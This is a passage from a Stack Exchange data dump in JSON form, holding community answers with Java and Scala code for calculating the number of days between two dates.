month, int day) {\r\n        //Calculates the day number of the given date; day 1 = January 1st in the yearZero\r\n\r\n        //Validate the input\r\n        if (year &lt; yearZero || month &lt; 1 || month &gt; 12 || day &lt; 1 || day &gt; 31) {\r\n            //Throw an exception\r\n            throw new IllegalArgumentException(&quot;Too many or too few days in month or months in year or the year is smaller than year zero&quot;);\r\n        }\r\n        else if (month == 4 || month == 6 || month == 9 || month == 11) {//Months with 30 days\r\n            if (day == 31) {\r\n                //Throw an exception\r\n                throw new IllegalArgumentException(&quot;Too many days in month&quot;);\r\n            }\r\n        }\r\n        else if (month == 2) {//February 28 or 29\r\n            if (isLeapYear(year)) {\r\n                if (day &gt; 29) {\r\n                    //Throw an exception\r\n                    throw new IllegalArgumentException(&quot;Too many days in month&quot;);\r\n                }\r\n            }\r\n            else if (day &gt; 28) {\r\n                //Throw an exception\r\n                throw new IllegalArgumentException(&quot;Too many days in month&quot;);\r\n            }\r\n        }\r\n\r\n        //Start counting days\r\n        int days = 0;\r\n\r\n        //Days in the target month until the target day\r\n        days = days + day;\r\n\r\n        //Days in the earlier months in the target year\r\n        for (int i = 1; i &lt; month; i++) {\r\n            switch (i) {\r\n                case 1: case 3: case 5:\r\n                case 7: case 8: case 10:\r\n                case 12:\r\n                    days = days + 31;\r\n                    break;\r\n                case 2:\r\n                    days = days + 28;\r\n                    if (isLeapYear(year)) {\r\n                        days = days + 1;\r\n                    }\r\n                    break;\r\n                case 4: case 6: case 9: case 11:\r\n                    days = days + 30;\r\n                    break;\r\n            }\r\n        }\r\n\r\n        //Days in the earlier years\r\n        for (int i = yearZero; i &lt; year; i++) {\r\n            days = days + 365;\r\n            if (isLeapYear(i)) {\r\n                days = days + 1;\r\n            }\r\n        }\r\n\r\n        return days;\r\n\r\n    }\r\n\r\n\r\n3)\r\n\r\n\r\n    public static int dateDiff (int startYear, int startMonth, int startDay, int endYear, int endMonth, int endDay) {\r\n\r\n        int yearZero;\r\n\r\n        //daysGoneSince presupposes that the first argument be smaller or equal to the second argument\r\n        if (10000 * startYear + 100 * startMonth + startDay &gt; 10000 * endYear + 100 * endMonth + endDay) {//If the end date is earlier than the start date\r\n            yearZero = endYear;\r\n        }\r\n        else {\r\n            yearZero = startYear;\r\n        }\r\n\r\n        return daysGoneSince(yearZero, endYear, endMonth, endDay) - daysGoneSince(yearZero, startYear, startMonth, startDay);\r\n\r\n    }\r\n","title":"Calculating the difference between two Java date instances","body":"<p>After having read many answers and comments to this question, I was left with the impression that one either has to use the Joda time or else take into account some peculiarities with the daylight saving time etc. Since I didn't want to do either of these, I ended up writing a few lines of code to calculate the difference between two dates without using any date or time related Java classes.</p>\n\n<p>In the code below the numbers of year, month and day are the same as in real life. For example in December 24th 2015, the year = 2015, the month = 12 and the day = 24.</p>\n\n<p>I want to share this code in case someone else wants to use it. There are 3 methods: 1) A method to find out whether a given year is a leap year 2) A method to calculate the number of a given day in relation to January 1st of a given year 3) A method to calculate the number of days between any two dates using the method 2 (number of the end date minus number of the start date).</p>\n\n<p>Here are the methods:</p>\n\n<p>1)</p>\n\n<pre><code>public static boolean isLeapYear (int year) {\n    //Every 4. year is a leap year, except if the year is divisible by 100 and not by 400\n    //For example 1900 is not a leap year but 2000 is\n\n    boolean result = false;\n\n    if (year % 4 == 0) {\n        result = true;\n    }\n    if (year % 100 == 0) {\n        result = false;\n    }\n    if (year % 400 == 0) {\n        result = true;\n    }\n\n    return result;\n\n}\n</code></pre>\n\n<p>2)</p>\n\n<pre><code>public static int daysGoneSince (int yearZero, int year, int month, int day) {\n    //Calculates the day number of the given date; day 1 = January 1st in the yearZero\n\n    //Validate the input\n    if (year &lt; yearZero || month &lt; 1 || month &gt; 12 || day &lt; 1 || day &gt; 31) {\n        //Throw an exception\n        throw new IllegalArgumentException(\"Too many or too few days in month or months in year or the year is smaller than year zero\");\n    }\n    else if (month == 4 || month == 6 || month == 9 || month == 11) {//Months with 30 days\n        if (day == 31) {\n            //Throw an exception\n            throw new IllegalArgumentException(\"Too many days in month\");\n        }\n    }\n    else if (month == 2) {//February 28 or 29\n        if (isLeapYear(year)) {\n            if (day &gt; 29) {\n                //Throw an exception\n                throw new IllegalArgumentException(\"Too many days in month\");\n            }\n        }\n        else if (day &gt; 28) {\n            //Throw an exception\n            throw new IllegalArgumentException(\"Too many days in month\");\n        }\n    }\n\n    //Start counting days\n    int days = 0;\n\n    //Days in the target month until the target day\n    days = days + day;\n\n    //Days in the earlier months in the target year\n    for (int i = 1; i &lt; month; i++) {\n        switch (i) {\n            case 1: case 3: case 5:\n            case 7: case 8: case 10:\n            case 12:\n                days = days + 31;\n                break;\n            case 2:\n                days = days + 28;\n                if (isLeapYear(year)) {\n                    days = days + 1;\n                }\n                break;\n            case 4: case 6: case 9: case 11:\n                days = days + 30;\n                break;\n        }\n    }\n\n    //Days in the earlier years\n    for (int i = yearZero; i &lt; year; i++) {\n        days = days + 365;\n        if (isLeapYear(i)) {\n            days = days + 1;\n        }\n    }\n\n    return days;\n\n}\n</code></pre>\n\n<p>3)</p>\n\n<pre><code>public static int dateDiff (int startYear, int startMonth, int startDay, int endYear, int endMonth, int endDay) {\n\n    int yearZero;\n\n    //daysGoneSince presupposes that the first argument be smaller or equal to the second argument\n    if (10000 * startYear + 100 * startMonth + startDay &gt; 10000 * endYear + 100 * endMonth + endDay) {//If the end date is earlier than the start date\n        yearZero = endYear;\n    }\n    else {\n        yearZero = startYear;\n    }\n\n    return daysGoneSince(yearZero, endYear, endMonth, endDay) - daysGoneSince(yearZero, startYear, startMonth, startDay);\n\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1098340,"reputation":9801,"user_id":1091436,"accept_rate":50,"display_name":"VasiliNovikov"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1491983149,"creation_date":1448367168,"answer_id":33893441,"question_id":1555262,"body_markdown":"Since the question is tagged with Scala,\r\n\r\n\timport scala.concurrent.duration._\r\n\tval diff = (System.currentTimeMillis() - oldDate.getTime).milliseconds\r\n\tval diffSeconds = diff.toSeconds\r\n\tval diffMinutes = diff.toMinutes\r\n\tval diffHours = diff.toHours\r\n\tval diffDays = diff.toDays","title":"Calculating the difference between two Java date instances","body":"<p>Since the question is tagged with Scala,</p>\n\n<pre><code>import scala.concurrent.duration._\nval diff = (System.currentTimeMillis() - oldDate.getTime).milliseconds\nval diffSeconds = diff.toSeconds\nval diffMinutes = diff.toMinutes\nval diffHours = diff.toHours\nval diffDays = diff.toDays\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2987511,"reputation":3024,"user_id":5772982,"display_name":"Kumar Abhishek"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1477494772,"creation_date":1477494772,"answer_id":40265989,"question_id":1555262,"body_markdown":" Earlier versions of Java you can try.\r\n\r\n     public static String daysBetween(Date createdDate, Date expiryDate) {\r\n    \r\n            Calendar createdDateCal = Calendar.getInstance();\r\n            createdDateCal.clear();\r\n            createdDateCal.setTime(createdDate);\r\n    \r\n            Calendar expiryDateCal = Calendar.getInstance();\r\n            expiryDateCal.clear();\r\n            expiryDateCal.setTime(expiryDate);\r\n    \r\n    \r\n            long daysBetween = 0;\r\n            while (createdDateCal.before(expiryDateCal)) {\r\n                createdDateCal.add(Calendar.DAY_OF_MONTH, 1);\r\n                daysBetween++;\r\n            }\r\n            return daysBetween+&quot;&quot;;\r\n        }","title":"Calculating the difference between two Java date instances","body":"<p>Earlier versions of Java you can try.</p>\n\n<pre><code> public static String daysBetween(Date createdDate, Date expiryDate) {\n\n        Calendar createdDateCal = Calendar.getInstance();\n        createdDateCal.clear();\n        createdDateCal.setTime(createdDate);\n\n        Calendar expiryDateCal = Calendar.getInstance();\n        expiryDateCal.clear();\n        expiryDateCal.setTime(expiryDate);\n\n\n        long daysBetween = 0;\n        while (createdDateCal.before(expiryDateCal)) {\n            createdDateCal.add(Calendar.DAY_OF_MONTH, 1);\n            daysBetween++;\n        }\n        return daysBetween+\"\";\n    }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":226762,"reputation":11452,"user_id":2162226,"accept_rate":70,"display_name":"Gene Bo"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1483598055,"creation_date":1483598055,"answer_id":41478625,"question_id":1555262,"body_markdown":"Another pure Java variation:\r\n\r\n    public boolean isWithin30Days(Calendar queryCalendar) {\r\n\r\n        // 1. Take the date you are checking, and roll it back N days\r\n        Calendar queryCalMinus30Days = Calendar.getInstance();\r\n        queryCalMinus30Days.setTime(queryCalendar.getTime());\r\n        queryCalMinus30Days.add(Calendar.DATE, -30); // subtract 30 days from the calendar\r\n\r\n        // 2. Get respective milliseconds for the two Calendars: now &amp; queryCal minus N days \r\n        long nowL = Calendar.getInstance().getTimeInMillis();\r\n        long queryCalMinus30DaysL = queryCalMinus30Days.getTimeInMillis();\r\n\r\n        // 3. if nowL is still less than the queryCalMinus30DaysL, it means queryCalendar is more than 30 days into future\r\n        boolean isWithin30Days = nowL &gt;= queryCalMinus30DaysL;\r\n\r\n        return isWithin30Days;\r\n    }\r\n\r\n*thanks to starter code here: https://stackoverflow.com/a/30207726/2162226*","title":"Calculating the difference between two Java date instances","body":"<p>Another pure Java variation:</p>\n\n<pre><code>public boolean isWithin30Days(Calendar queryCalendar) {\n\n    // 1. Take the date you are checking, and roll it back N days\n    Calendar queryCalMinus30Days = Calendar.getInstance();\n    queryCalMinus30Days.setTime(queryCalendar.getTime());\n    queryCalMinus30Days.add(Calendar.DATE, -30); // subtract 30 days from the calendar\n\n    // 2. Get respective milliseconds for the two Calendars: now &amp; queryCal minus N days \n    long nowL = Calendar.getInstance().getTimeInMillis();\n    long queryCalMinus30DaysL = queryCalMinus30Days.getTimeInMillis();\n\n    // 3. if nowL is still less than the queryCalMinus30DaysL, it means queryCalendar is more than 30 days into future\n    boolean isWithin30Days = nowL &gt;= queryCalMinus30DaysL;\n\n    return isWithin30Days;\n}\n</code></pre>\n\n<p><em>thanks to starter code here: <a href=\"https://stackoverflow.com/a/30207726/2162226\">https://stackoverflow.com/a/30207726/2162226</a></em></p>\n"},{"tags":[],"owner":{"account_id":1020031,"reputation":121,"user_id":1030646,"accept_rate":100,"display_name":"suxumuxu"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1495459278,"creation_date":1493387649,"answer_id":43681941,"question_id":1555262,"body_markdown":"Here&#39;s a correct Java 7 solution in O(1) without any dependencies.\r\n\r\n    public static int countDaysBetween(Date date1, Date date2) {\r\n\r\n        Calendar c1 = removeTime(from(date1));\r\n        Calendar c2 = removeTime(from(date2));\r\n\r\n        if (c1.get(YEAR) == c2.get(YEAR)) {\r\n\r\n            return Math.abs(c1.get(DAY_OF_YEAR) - c2.get(DAY_OF_YEAR)) + 1;\r\n        }\r\n        // ensure c1 &lt;= c2\r\n        if (c1.get(YEAR) &gt; c2.get(YEAR)) {\r\n            Calendar c = c1;\r\n            c1 = c2;\r\n            c2 = c;\r\n        }\r\n        int y1 = c1.get(YEAR);\r\n        int y2 = c2.get(YEAR);\r\n        int d1 = c1.get(DAY_OF_YEAR);\r\n        int d2 = c2.get(DAY_OF_YEAR);\r\n\r\n        return d2 + ((y2 - y1) * 365) - d1 + countLeapYearsBetween(y1, y2) + 1;\r\n    }\r\n\r\n    private static int countLeapYearsBetween(int y1, int y2) {\r\n\r\n        if (y1 &lt; 1 || y2 &lt; 1) {\r\n            throw new IllegalArgumentException(&quot;Year must be &gt; 0.&quot;);\r\n        }\r\n        // ensure y1 &lt;= y2\r\n        if (y1 &gt; y2) {\r\n            int i = y1;\r\n            y1 = y2;\r\n            y2 = i;\r\n        }\r\n\r\n        int diff = 0;\r\n\r\n        int firstDivisibleBy4 = y1;\r\n        if (firstDivisibleBy4 % 4 != 0) {\r\n            firstDivisibleBy4 += 4 - (y1 % 4);\r\n        }\r\n        diff = y2 - firstDivisibleBy4 - 1;\r\n        int divisibleBy4 = diff &lt; 0 ? 0 : diff / 4 + 1;\r\n\r\n        int firstDivisibleBy100 = y1;\r\n        if (firstDivisibleBy100 % 100 != 0) {\r\n            firstDivisibleBy100 += 100 - (firstDivisibleBy100 % 100);\r\n        }\r\n        diff = y2 - firstDivisibleBy100 - 1;\r\n        int divisibleBy100 = diff &lt; 0 ? 0 : diff / 100 + 1;\r\n\r\n        int firstDivisibleBy400 = y1;\r\n        if (firstDivisibleBy400 % 400 != 0) {\r\n            firstDivisibleBy400 += 400 - (y1 % 400);\r\n        }\r\n        diff = y2 - firstDivisibleBy400 - 1;\r\n        int divisibleBy400 = diff &lt; 0 ? 0 : diff / 400 + 1;\r\n\r\n        return divisibleBy4 - divisibleBy100 + divisibleBy400;\r\n    }\r\n\r\n\r\n    public static Calendar from(Date date) {\r\n\r\n        Calendar c = Calendar.getInstance();\r\n        c.setTime(date);\r\n        \r\n        return c;\r\n    }\r\n\r\n\r\n    public static Calendar removeTime(Calendar c) {\r\n\r\n        c.set(HOUR_OF_DAY, 0);\r\n        c.set(MINUTE, 0);\r\n        c.set(SECOND, 0);\r\n        c.set(MILLISECOND, 0);\r\n\r\n        return c;\r\n    }","title":"Calculating the difference between two Java date instances","body":"<p>Here's a correct Java 7 solution in O(1) without any dependencies.</p>\n\n<pre><code>public static int countDaysBetween(Date date1, Date date2) {\n\n    Calendar c1 = removeTime(from(date1));\n    Calendar c2 = removeTime(from(date2));\n\n    if (c1.get(YEAR) == c2.get(YEAR)) {\n\n        return Math.abs(c1.get(DAY_OF_YEAR) - c2.get(DAY_OF_YEAR)) + 1;\n    }\n    // ensure c1 &lt;= c2\n    if (c1.get(YEAR) &gt; c2.get(YEAR)) {\n        Calendar c = c1;\n        c1 = c2;\n        c2 = c;\n    }\n    int y1 = c1.get(YEAR);\n    int y2 = c2.get(YEAR);\n    int d1 = c1.get(DAY_OF_YEAR);\n    int d2 = c2.get(DAY_OF_YEAR);\n\n    return d2 + ((y2 - y1) * 365) - d1 + countLeapYearsBetween(y1, y2) + 1;\n}\n\nprivate static int countLeapYearsBetween(int y1, int y2) {\n\n    if (y1 &lt; 1 || y2 &lt; 1) {\n        throw new IllegalArgumentException(\"Year must be &gt; 0.\");\n    }\n    // ensure y1 &lt;= y2\n    if (y1 &gt; y2) {\n        int i = y1;\n        y1 = y2;\n        y2 = i;\n    }\n\n    int diff = 0;\n\n    int firstDivisibleBy4 = y1;\n    if (firstDivisibleBy4 % 4 != 0) {\n        firstDivisibleBy4 += 4 - (y1 % 4);\n    }\n    diff = y2 - firstDivisibleBy4 - 1;\n    int divisibleBy4 = diff &lt; 0 ? 0 : diff / 4 + 1;\n\n    int firstDivisibleBy100 = y1;\n    if (firstDivisibleBy100 % 100 != 0) {\n        firstDivisibleBy100 += 100 - (firstDivisibleBy100 % 100);\n    }\n    diff = y2 - firstDivisibleBy100 - 1;\n    int divisibleBy100 = diff &lt; 0 ? 0 : diff / 100 + 1;\n\n    int firstDivisibleBy400 = y1;\n    if (firstDivisibleBy400 % 400 != 0) {\n        firstDivisibleBy400 += 400 - (y1 % 400);\n    }\n    diff = y2 - firstDivisibleBy400 - 1;\n    int divisibleBy400 = diff &lt; 0 ? 0 : diff / 400 + 1;\n\n    return divisibleBy4 - divisibleBy100 + divisibleBy400;\n}\n\n\npublic static Calendar from(Date date) {\n\n    Calendar c = Calendar.getInstance();\n    c.setTime(date);\n\n    return c;\n}\n\n\npublic static Calendar removeTime(Calendar c) {\n\n    c.set(HOUR_OF_DAY, 0);\n    c.set(MINUTE, 0);\n    c.set(SECOND, 0);\n    c.set(MILLISECOND, 0);\n\n    return c;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":957044,"reputation":47672,"user_id":982161,"accept_rate":63,"display_name":"ΦXocę 웃 Пepe&#250;pa ツ"},"down_vote_count":0,"up_vote_count":24,"is_accepted":false,"score":24,"last_activity_date":1505805197,"creation_date":1495095569,"answer_id":44042271,"question_id":1555262,"body_markdown":"Since all the answers here are correct but use legacy java or 3rd party libs like joda or similar, I will just drop another way using new [java.time][1] classes in Java 8 and later. See [Oracle Tutorial][2].\r\n\r\nUse [`LocalDate`][3] and [`ChronoUnit`][4]:\r\n\r\n    LocalDate d1 = LocalDate.of(2017, 5, 1);\r\n    LocalDate d2 = LocalDate.of(2017, 5, 18);\r\n\r\n    long days = ChronoUnit.DAYS.between(d1, d2);\r\n    System.out.println( days );\r\n\r\n\r\n  [1]: https://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html\r\n  [2]: https://docs.oracle.com/javase/tutorial/datetime/iso/period.html\r\n  [3]: https://docs.oracle.com/javase/8/docs/api/java/time/LocalDate.html\r\n  [4]: https://docs.oracle.com/javase/8/docs/api/java/time/Period.html","title":"Calculating the difference between two Java date instances","body":"<p>Since all the answers here are correct but use legacy java or 3rd party libs like joda or similar, I will just drop another way using new <a href=\"https://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html\" rel=\"noreferrer\">java.time</a> classes in Java 8 and later. See <a href=\"https://docs.oracle.com/javase/tutorial/datetime/iso/period.html\" rel=\"noreferrer\">Oracle Tutorial</a>.</p>\n\n<p>Use <a href=\"https://docs.oracle.com/javase/8/docs/api/java/time/LocalDate.html\" rel=\"noreferrer\"><code>LocalDate</code></a> and <a href=\"https://docs.oracle.com/javase/8/docs/api/java/time/Period.html\" rel=\"noreferrer\"><code>ChronoUnit</code></a>:</p>\n\n<pre><code>LocalDate d1 = LocalDate.of(2017, 5, 1);\nLocalDate d2 = LocalDate.of(2017, 5, 18);\n\nlong days = ChronoUnit.DAYS.between(d1, d2);\nSystem.out.println( days );\n</code></pre>\n"},{"tags":[],"owner":{"account_id":987434,"reputation":10946,"user_id":1005607,"accept_rate":64,"display_name":"gene b."},"down_vote_count":0,"up_vote_count":5,"is_accepted":false,"score":5,"last_activity_date":1541437529,"creation_date":1541437529,"answer_id":53158976,"question_id":1555262,"body_markdown":"After wading through all the other answers, to keep the Java 7 Date type but be more precise/standard with the Java 8 diff approach,\r\n\r\n    public static long daysBetweenDates(Date d1, Date d2) {\r\n    \tInstant instant1 = d1.toInstant();\r\n    \tInstant instant2 = d2.toInstant();\r\n    \tlong diff = ChronoUnit.DAYS.between(instant1, instant2);\r\n    \treturn diff;\r\n    }","title":"Calculating the difference between two Java date instances","body":"<p>After wading through all the other answers, to keep the Java 7 Date type but be more precise/standard with the Java 8 diff approach,</p>\n\n<pre><code>public static long daysBetweenDates(Date d1, Date d2) {\n    Instant instant1 = d1.toInstant();\n    Instant instant2 = d2.toInstant();\n    long diff = ChronoUnit.DAYS.between(instant1, instant2);\n    return diff;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2239559,"reputation":153,"user_id":1974951,"display_name":"Fabi"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1550159876,"creation_date":1550159473,"answer_id":54694285,"question_id":1555262,"body_markdown":"If you want to **fix** the issue for date ranges that **cross daylight savings time boundary** (e.g. one date in summer time and the other one in winter time), you can use this to get the **difference in days**:\r\n\r\n    public static long calculateDifferenceInDays(Date start, Date end, Locale locale) {\r\n        Calendar cal = Calendar.getInstance(locale);\r\n\r\n        cal.setTime(start);\r\n        cal.set(Calendar.HOUR_OF_DAY, 0);\r\n        cal.set(Calendar.MINUTE, 0);\r\n        cal.set(Calendar.SECOND, 0);\r\n        cal.set(Calendar.MILLISECOND, 0);\r\n        long startTime = cal.getTimeInMillis();\r\n\r\n        cal.setTime(end);\r\n        cal.set(Calendar.HOUR_OF_DAY, 0);\r\n        cal.set(Calendar.MINUTE, 0);\r\n        cal.set(Calendar.SECOND, 0);\r\n        cal.set(Calendar.MILLISECOND, 0);\r\n        long endTime = cal.getTimeInMillis();\r\n\r\n        // calculate the offset if one of the dates is in summer time and the other one in winter time\r\n        TimeZone timezone = cal.getTimeZone();\r\n        int offsetStart = timezone.getOffset(startTime);\r\n        int offsetEnd = timezone.getOffset(endTime);\r\n        int offset = offsetEnd - offsetStart;\r\n\r\n        return TimeUnit.MILLISECONDS.toDays(endTime - startTime + offset);\r\n    }","title":"Calculating the difference between two Java date instances","body":"<p>If you want to <strong>fix</strong> the issue for date ranges that <strong>cross daylight savings time boundary</strong> (e.g. one date in summer time and the other one in winter time), you can use this to get the <strong>difference in days</strong>:</p>\n\n<pre><code>public static long calculateDifferenceInDays(Date start, Date end, Locale locale) {\n    Calendar cal = Calendar.getInstance(locale);\n\n    cal.setTime(start);\n    cal.set(Calendar.HOUR_OF_DAY, 0);\n    cal.set(Calendar.MINUTE, 0);\n    cal.set(Calendar.SECOND, 0);\n    cal.set(Calendar.MILLISECOND, 0);\n    long startTime = cal.getTimeInMillis();\n\n    cal.setTime(end);\n    cal.set(Calendar.HOUR_OF_DAY, 0);\n    cal.set(Calendar.MINUTE, 0);\n    cal.set(Calendar.SECOND, 0);\n    cal.set(Calendar.MILLISECOND, 0);\n    long endTime = cal.getTimeInMillis();\n\n    // calculate the offset if one of the dates is in summer time and the other one in winter time\n    TimeZone timezone = cal.getTimeZone();\n    int offsetStart = timezone.getOffset(startTime);\n    int offsetEnd = timezone.getOffset(endTime);\n    int offset = offsetEnd - offsetStart;\n\n    return TimeUnit.MILLISECONDS.toDays(endTime - startTime + offset);\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":16209703,"reputation":537,"user_id":11704057,"display_name":"M22"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1638044834,"creation_date":1638044834,"answer_id":70138442,"question_id":1555262,"body_markdown":"Since dates can contain hours and minutes, final result will be rounded down, which will result in incorrect value. For example, you calculate difference between **today at 22:00 p.m** and **day after tomorrow 00:00 a.m**, so the final result will be 1, because in reality it was 1.08 *or smth* difference, then it gets rounded down when calling ```TimeUnit.MILLISECONDS.toDays(..)```. That&#39;s why you need to take that in account, so in my solution I subtract the remainder of milliseconds from milliseconds in a day. Additionally, if you want to count the end date, you need to +1 it.\r\n\r\n```java\r\nimport java.util.Date;\r\nimport java.util.concurrent.TimeUnit;\r\n\r\npublic static long getDaysBetween(Date date1, Date date2, boolean includeEndDate) {\r\n        long millisInDay = 60 * 60 * 24 * 1000;\r\n        long difference = Math.abs(date1.getTime() - date2.getTime());\r\n        long add = millisInDay - (difference % millisInDay);//is used to calculate true number of days, because by default hours, minutes are also counted\r\n\r\n        return TimeUnit.MILLISECONDS.toDays(difference + add) + (includeEndDate ? 1 : 0);\r\n    }\r\n```\r\n\r\nTests:\r\n```java\r\nDate date1 = new Date(121, Calendar.NOVEMBER, 27); //2021 Nov 27\r\nDate date2 = new Date(121, Calendar.DECEMBER, 29); //2021 Dec 29\r\nSystem.out.println( getDaysBetween(date1, date2, false) ); //32 days difference\r\nSystem.out.println( getDaysBetween(date1, date2, true) ); //33 days difference\r\n```","title":"Calculating the difference between two Java date instances","body":"<p>Since dates can contain hours and minutes, final result will be rounded down, which will result in incorrect value. For example, you calculate difference between <strong>today at 22:00 p.m</strong> and <strong>day after tomorrow 00:00 a.m</strong>, so the final result will be 1, because in reality it was 1.08 <em>or smth</em> difference, then it gets rounded down when calling <code>TimeUnit.MILLISECONDS.toDays(..)</code>. That's why you need to take that in account, so in my solution I subtract the remainder of milliseconds from milliseconds in a day. Additionally, if you want to count the end date, you need to +1 it.</p>\n<pre class=\"lang-java prettyprint-override\"><code>import java.util.Date;\nimport java.util.concurrent.TimeUnit;\n\npublic static long getDaysBetween(Date date1, Date date2, boolean includeEndDate) {\n        long millisInDay = 60 * 60 * 24 * 1000;\n        long difference = Math.abs(date1.getTime() - date2.getTime());\n        long add = millisInDay - (difference % millisInDay);//is used to calculate true number of days, because by default hours, minutes are also counted\n\n        return TimeUnit.MILLISECONDS.toDays(difference + add) + (includeEndDate ? 1 : 0);\n    }\n</code></pre>\n<p>Tests:</p>\n<pre class=\"lang-java prettyprint-override\"><code>Date date1 = new Date(121, Calendar.NOVEMBER, 27); //2021 Nov 27\nDate date2 = new Date(121, Calendar.DECEMBER, 29); //2021 Dec 29\nSystem.out.println( getDaysBetween(date1, date2, false) ); //32 days difference\nSystem.out.println( getDaysBetween(date1, date2, true) ); //33 days difference\n</code></pre>\n"},{"tags":[],"owner":{"account_id":9254180,"reputation":35,"user_id":6873651,"display_name":"Karthikeyan Sankar"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1683713524,"creation_date":1683713524,"answer_id":76217201,"question_id":1555262,"body_markdown":"This will perfectly works with joda api  \r\n   \r\n\r\n     import java.util.Calendar;\r\n        import java.util.Date;\r\n        import java.util.GregorianCalendar;\r\n        import java.text.ParseException;\r\n        import java.text.SimpleDateFormat;\r\n        import org.joda.time.DateTime;\r\n        import org.joda.time.Months;\r\n        import org.joda.time.Weeks;\r\n        import org.joda.time.Years;\r\n        import java.util.LinkedHashMap;\r\n        \r\n        public Map&lt;String,Integer&gt; Datedifference(String fromDate,String toDate) throws ParseException {\t\r\n        \t\t\tMap&lt;String,Integer&gt; dateUtilMap = new LinkedHashMap&lt;String, Integer&gt;();\r\n        \t\t \tDate date1=new SimpleDateFormat(&quot;dd-MM-yyyy&quot;).parse(fromDate);  \r\n        \t\t \tDate date2=new SimpleDateFormat(&quot;dd-MM-yyyy&quot;).parse(toDate);  \r\n        \t\t  \tCalendar fromDay = new GregorianCalendar();\r\n        \t\t  \tfromDay.setTime(date1);\r\n        \t        Calendar toDay = new GregorianCalendar();\r\n        \t        toDay.setTime(date2);\r\n        \t        \r\n        \t        int days = (int) (1+(toDay.getTimeInMillis() -fromDay.getTimeInMillis()) / 1000 / 60 / 60 / 24);\r\n        \t        \r\n        \t        if(days &gt;1) {\r\n        \t        \t\r\n        \t        DateTime dateTime1 = new DateTime(fromDay);\r\n        \t        DateTime dateTime2 = new DateTime(toDay);\r\n        \t        \r\n        \t        int weeks = Weeks.weeksBetween(dateTime1.dayOfWeek().withMinimumValue().minusDays(1), \r\n        \t        \t\tdateTime2.dayOfWeek().withMaximumValue().plusDays(1)).getWeeks();\r\n        \t        \r\n        \t        int months = Months.monthsBetween(dateTime1.dayOfMonth().withMinimumValue().minusDays(1),\r\n        \t        \t\tdateTime2.dayOfMonth().withMaximumValue().plusDays(1)).getMonths();\r\n        \t        \r\n        \t        int years =1+Years.yearsBetween(dateTime1, dateTime2).getYears();\r\n        \t        \r\n        \t        dateUtilMap.put(&quot;days&quot;, days);\r\n        \t        dateUtilMap.put(&quot;weeks&quot;, weeks);\r\n        \t        dateUtilMap.put(&quot;months&quot;, months);\r\n        \t        dateUtilMap.put(&quot;years&quot;, years);\r\n        \t        System.out.println(dateUtilMap);\r\n        \t        return dateUtilMap;\t       \r\n        \t        } else {\r\n        \t        \tSystem.out.println(&quot;From Date Must be samller than to Date&quot;);\r\n        \t         return null;\r\n        \t        } \r\n        \t}","title":"Calculating the difference between two Java date instances","body":"<p>This will perfectly works with joda api</p>\n<pre><code> import java.util.Calendar;\n    import java.util.Date;\n    import java.util.GregorianCalendar;\n    import java.text.ParseException;\n    import java.text.SimpleDateFormat;\n    import org.joda.time.DateTime;\n    import org.joda.time.Months;\n    import org.joda.time.Weeks;\n    import org.joda.time.Years;\n    import java.util.LinkedHashMap;\n    \n    public Map&lt;String,Integer&gt; Datedifference(String fromDate,String toDate) throws ParseException {    \n                Map&lt;String,Integer&gt; dateUtilMap = new LinkedHashMap&lt;String, Integer&gt;();\n                Date date1=new SimpleDateFormat(&quot;dd-MM-yyyy&quot;).parse(fromDate);  \n                Date date2=new SimpleDateFormat(&quot;dd-MM-yyyy&quot;).parse(toDate);  \n                Calendar fromDay = new GregorianCalendar();\n                fromDay.setTime(date1);\n                Calendar toDay = new GregorianCalendar();\n                toDay.setTime(date2);\n                \n                int days = (int) (1+(toDay.getTimeInMillis() -fromDay.getTimeInMillis()) / 1000 / 60 / 60 / 24);\n                \n                if(days &gt;1) {\n                    \n                DateTime dateTime1 = new DateTime(fromDay);\n                DateTime dateTime2 = new DateTime(toDay);\n                \n                int weeks = Weeks.weeksBetween(dateTime1.dayOfWeek().withMinimumValue().minusDays(1), \n                        dateTime2.dayOfWeek().withMaximumValue().plusDays(1)).getWeeks();\n                \n                int months = Months.monthsBetween(dateTime1.dayOfMonth().withMinimumValue().minusDays(1),\n                        dateTime2.dayOfMonth().withMaximumValue().plusDays(1)).getMonths();\n                \n                int years =1+Years.yearsBetween(dateTime1, dateTime2).getYears();\n                \n                dateUtilMap.put(&quot;days&quot;, days);\n                dateUtilMap.put(&quot;weeks&quot;, weeks);\n                dateUtilMap.put(&quot;months&quot;, months);\n                dateUtilMap.put(&quot;years&quot;, years);\n                System.out.println(dateUtilMap);\n                return dateUtilMap;        \n                } else {\n                    System.out.println(&quot;From Date Must be samller than to Date&quot;);\n                 return null;\n                } \n        }\n</code></pre>\n"}],"owner":{"account_id":19815,"reputation":21775,"user_id":46768,"accept_rate":74,"display_name":"pr1001"},"comment_count":9,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":785323,"favorite_count":0,"down_vote_count":0,"up_vote_count":501,"accepted_answer_id":1555307,"answer_count":46,"score":501,"last_activity_date":1683713524,"creation_date":1255361749,"question_id":1555262,"body_markdown":"I&#39;m using Java&#39;s `java.util.Date` class in Scala and want to compare a `Date` object and the current time. I know I can calculate the delta by using getTime():\r\n\r\n    (new java.util.Date()).getTime() - oldDate.getTime()\r\n\r\nHowever, this just leaves me with a `long` representing milliseconds. Is there any simpler, nicer way to get a time delta?","title":"Calculating the difference between two Java date instances","body":"<p>I'm using Java's <code>java.util.Date</code> class in Scala and want to compare a <code>Date</code> object and the current time. I know I can calculate the delta by using getTime():</p>\n\n<pre><code>(new 